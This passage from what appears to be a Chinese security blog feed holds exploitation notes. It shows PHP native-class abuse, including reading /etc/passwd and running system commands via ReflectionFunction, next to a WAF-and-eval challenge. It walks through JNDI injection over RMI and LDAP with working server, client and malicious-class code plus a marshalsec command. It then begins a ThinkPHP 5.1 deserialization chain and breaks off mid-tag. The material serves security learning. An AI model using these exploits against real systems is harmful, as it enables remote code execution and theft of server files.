class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">DirectoryIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">SplFileInfo</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> &#123;<br><span class="hljs-comment">/* 方法 */</span><br><span class="hljs-keyword">public</span> __construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> )<br><span class="hljs-keyword">public</span> current ( ) : <span class="hljs-built_in">DirectoryIterator</span><br><span class="hljs-keyword">public</span> getATime ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getBasename ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$suffix</span> = ? ) : <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> getCTime ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getExtension ( ) : <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> getFilename ( ) : <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> getGroup ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getInode ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getMTime ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getOwner ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getPath ( ) : <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> getPathname ( ) : <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> getPerms ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getSize ( ) : <span class="hljs-keyword">int</span><br><span class="hljs-keyword">public</span> getType ( ) : <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> isDir ( ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> isDot ( ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> isExecutable ( ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> isFile ( ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> isLink ( ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> isReadable ( ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> isWritable ( ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> key ( ) : <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> next ( ) : <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> rewind ( ) : <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> seek ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$position</span> ) : <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> __toString ( ) : <span class="hljs-keyword">string</span>    <span class="hljs-comment">// 以字符串形式获取文件名</span><br><span class="hljs-keyword">public</span> valid ( ) : <span class="hljs-keyword">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h1><p>列出目录下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><p>读取文件，但是不添加其他参数只能读取第一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br></code></pre></td></tr></table></figure><p>可以通过遍历的方式读取所有内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h1><p>invokeArgs 可执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ReflectionFunction(<span class="hljs-string">&#x27;call_user_func&#x27;</span>);<br><span class="hljs-variable">$a</span>-&gt;invokeArgs(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ReflectionFunction(<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-variable">$a</span>-&gt;invokeArgs(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d8ab33c9bd.jpg"></p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/U4bbd76a58f51487b9f366ef386ad88504.jpg"></p><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>,<span class="hljs-string">&quot;NepnEpneP&quot;</span>, <span class="hljs-variable">$s</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_</span> = waf(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    <span class="hljs-variable">$__</span> = waf(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$_</span>(<span class="hljs-variable">$__</span>);&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;?&#x27;</span>);&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = waf(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>    <span class="hljs-variable">$d</span> = waf(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$a-&gt;<span class="hljs-subst">$c</span>(<span class="hljs-subst">$d</span>);&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;getMessage&quot;</span>;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo \$a-&gt;<span class="hljs-subst">$c</span>(<span class="hljs-subst">$d</span>);&quot;</span>);&#125;<br><br><br><br><span class="hljs-comment">//$a = new Error(&#x27;?&#x27;);</span><br><span class="hljs-comment">//$c = &quot;getMessage&quot;;</span><br><span class="hljs-comment">//$d = &quot;eval(phpinfo())&quot;;</span><br><span class="hljs-comment">//eval(&quot;\$a-&gt;$c($d);&quot;);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JNDI注入</title>
    <link href="/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。JNDI本质上是一个接口，在这个接口下可以实现多种目录系统服务，如RMI、LDAP等，可以通过名称查询相关对象</p><p><img src="https://www.hualigs.cn/image/607a712f64075.jpg"></p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation）  即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message  Protocol，Java远程消息交换协议）以及CORBA。</p><p>相当于跨越jvm，调用一个远程方法。RMI是一种行为，即Java远程方法调用</p><h2 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h2><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p><p>本质上是一个协议，用于Java RMI过程，功能上相当于web访问中的http协议，只有通过使用该协议才能实现RMI远程方法调用</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。本质上相当于一个数据库，</p><h1 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h1><p>JNDI支持多种服务类型，当服务类型为RMI协议时，如果从RMI注册服务中lookup的对象类型为Reference类型或其子类时会导致远程代码执行。</p><p>因为Reference类提供了两个重要属性：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-number">1.</span>className<br>远程调用引用的类名<br><br><span class="hljs-number">2.</span>codebase <span class="hljs-built_in">url</span><br>决定在进行rmi远程调用时对象的位置，codebase <span class="hljs-built_in">url</span>支持http协议，当通过lookup寻找的远程调用类在RMI服务器的CLASSPATH不存在时就会从指定的codebase <span class="hljs-built_in">url</span>进行类的加载，如果两者都没有，远程调用失败<br></code></pre></td></tr></table></figure><p><strong>JNDI RCE漏洞产生原因</strong></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">在lookup的时候，会从RMI注册中心下载数据，由于服务名称和对象或命名引用相关联，只要在Registrations注册中心注册一个命名引用，即<span class="hljs-keyword">Reference</span>，它具有三个参数，className、factory、classFactoryLocation。ookup它并下载到本地后，会使用<span class="hljs-keyword">Reference</span>的classFactoryLocation指定的地址去下载className指定<span class="hljs-keyword">class</span>文件，接着加载并实例化，这样就会远程调用类的构造方法，如果把恶意代码放在远程调用类的构造方法中，就可以触发RCE。<br></code></pre></td></tr></table></figure><h1 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h1><p>适用版本：小于JDK 6u132<code>, </code>JDK 7u122<code>, </code>JDK 8u113（原因是Java提升了JNDI 限制了<code>Naming/Directory</code>服务中<code>JNDI Reference</code>远程加载<code>Object Factory</code>类的特性。系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为<code>false</code>，即默认不允许从远程的<code>Codebase</code>加载<code>Reference</code>工厂类。）</p><p><strong>测试jdk版本 8u101</strong></p><p>CIENT.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jndi;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String uri = <span class="hljs-string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>;<br>        Context ctx = <span class="hljs-keyword">new</span> InitialContext();<br>        ctx.lookup(uri);<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>SERVER.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jndi;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SERVER</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Reference aa = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;ExecTest&quot;</span>, <span class="hljs-string">&quot;ExecTest&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8081/&quot;</span>);<br>        ReferenceWrapper refObjWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(aa);<br>        System.out.println(<span class="hljs-string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/aa&#x27;&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>, refObjWrapper);<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p> ExecTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.Reader;<br><span class="hljs-keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExecTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException,InterruptedException</span>&#123;<br>        <br>        String cmd=<span class="hljs-string">&quot;calc&quot;</span>;<br>        <span class="hljs-keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);<br>        printMessage(process.getInputStream());;<br>        printMessage(process.getErrorStream());<br>        <span class="hljs-keyword">int</span> value=process.waitFor();<br>        System.out.println(value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printMessage</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputStream input)</span> </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">new</span> Thread (<span class="hljs-keyword">new</span> Runnable() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                <span class="hljs-comment">// TODO Auto-generated method stub</span><br>                Reader reader =<span class="hljs-keyword">new</span> InputStreamReader(input);<br>                BufferedReader bf = <span class="hljs-keyword">new</span> BufferedReader(reader);<br>                String line = <span class="hljs-keyword">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">while</span> ((line=bf.readLine())!=<span class="hljs-keyword">null</span>)<br>                    &#123;<br>                        System.out.println(line);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (IOException  e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>把编译好的ExecTest.class文件放到web目录下</p><p><img src="https://www.hualigs.cn/image/607a712f07b8b.jpg"></p><p>启用web服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">py</span> -<span class="hljs-number">3</span> -m http.server <span class="hljs-number">8081</span><br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607a712f0c50e.jpg"></p><p>在IDEA里执行SERVER和CLIENT，成功弹出计算器</p><p><img src="https://www.hualigs.cn/image/607a71313dd35.jpg"></p><h1 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h1><p>除了RMI服务外，JNDI还可以对接LDAP服务，只需要把lookup的地址改成<code>ldap://</code>即可，同样可以从攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>适用版本</p><p>小于JDK 11.0.1、8u191、7u201、6u211（之后com.sun.jndi.ldap.object.trustURLCodebase属性值被调整为false）</p><p>这里使用工具来搭建ldap服务端 <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>安装过程</p><p><a href="https://www.cnblogs.com/cute-puli/p/14373826.html">https://www.cnblogs.com/cute-puli/p/14373826.html</a></p><p><a href="https://blog.csdn.net/qq_43968080/article/details/105586109">https://blog.csdn.net/qq_43968080/article/details/105586109</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="hljs-number">127.0.0.1:8081</span>/#ExecTest<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607a7130023a8.jpg"></p><p>跟之前一样开启http服务并把恶意类class文件复制到目录下</p><p><img src="https://www.hualigs.cn/image/607a71307a7c9.jpg"></p><p><img src="https://www.hualigs.cn/image/607a71305d929.jpg"></p><p>CLIENT.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jndi;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Object object=<span class="hljs-keyword">new</span> InitialContext().lookup(<span class="hljs-string">&quot;ldap://192.168.111.129:1389/ExecTest&quot;</span>);<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://www.hualigs.cn/image/607a71316d72c.jpg"></p><h1 id="绕过高版本限制"><a href="#绕过高版本限制" class="headerlink" title="绕过高版本限制"></a>绕过高版本限制</h1><p>版本大于<code>JDK 11.0.1、8u191、7u201、6u211</code>时，之前这些利用方式都已经失效。但是仍然可以绕过</p><p>两种绕过方法：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.找到一个受害者本地CLASSPATH中的类作为恶意的<span class="hljs-keyword">Reference</span> Factory工厂类，并利用这个本地的Factory类执行命令。<br><br><span class="hljs-number">2</span>.利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 <br></code></pre></td></tr></table></figure><p>主要依靠受害者本地<code>CLASSPATH</code>中的类，需要利用受害者本地的<code>Gadget</code>进行攻击。</p><p>参考：</p><p><a href="https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/">https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://xz.aliyun.com/t/6633">https://xz.aliyun.com/t/6633</a></p><p><a href="https://www.anquanke.com/post/id/221917#h3-2">https://www.anquanke.com/post/id/221917#h3-2</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp 5.1.x 反序列化漏洞分析.md</title>
    <link href="/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/"/>
    <url>/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/</url>
    
    <content type="html"><![CDATA[<h1 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/thinkphp/</span>library<span class="hljs-regexp">/think/</span>process<span class="hljs-regexp">/pipes/</span>Windows.php<br></code></pre></td></tr></table></figure><p>存在<code>__destruct()</code>方法</p><p><img src="https://ae01.alicdn.com/kf/Ue153544e99674753b354a81fa2d37f22w.jpg"></p><p>跟进removeFiles()，file_exists在处理filename时会当成字符串处理，只要让构造<code>$this-&gt;files</code>为包含类的数组就可以调用<code>__toString()</code></p><p><img src="https://ae01.alicdn.com/kf/U8e3f924c78034285a8a1e3c82c79c3ce7.jpg"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/thinkphp/library/think/model/concern/<span class="hljs-keyword">Conversion</span>.php<br></code></pre></td></tr></table></figure><p>存在<code>_toString()</code></p><p><img src="https://ae01.alicdn.com/kf/U662f8ffb045e4216bf80f3a2ba789026B.jpg"></p><p><code>toJson()</code></p><p>调用<code>toArray()</code></p><p><img src="https://ae01.alicdn.com/kf/U461c285aba7b47d8b151dc337af9f213I.jpg"></p><p><code>toArray()</code></p><p>需要让<code>$this-&gt;visible</code>为空，<code>$this-&gt;hidden</code>为空，调用<code>getAttr()</code>。<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。</p><p><img src="https://ae01.alicdn.com/kf/U0afb602c82f54d19999c9022498e7e718.jpg"></p><p><code>getAttr()</code>满足条件<code>isset($this-&gt;withAttr[$fieldName])</code>即可命令执行，参数可控</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$closure</span> = <span class="hljs-variable">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>];<br><span class="hljs-variable">$value</span>   = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$this</span>-&gt;data);<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p><p><code>getData()</code>，需要满足第二个条件<code>$this-&gt;data</code>数组中存在<code>$name</code>键，即可返回<code>$this-&gt;data[$name]</code></p><p><img src="https://ae01.alicdn.com/kf/U814f07fd9107466a9da9c0e9dad752f4q.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/thinkphp/</span>library<span class="hljs-regexp">/think/</span>Loader.php<br></code></pre></td></tr></table></figure><p><code>Loader::parseName</code></p><p>parseName会把大写字母转为小写并在前面加上_，如<code>A</code>变成<code>_a</code>，不影响payload的构造</p><p><img 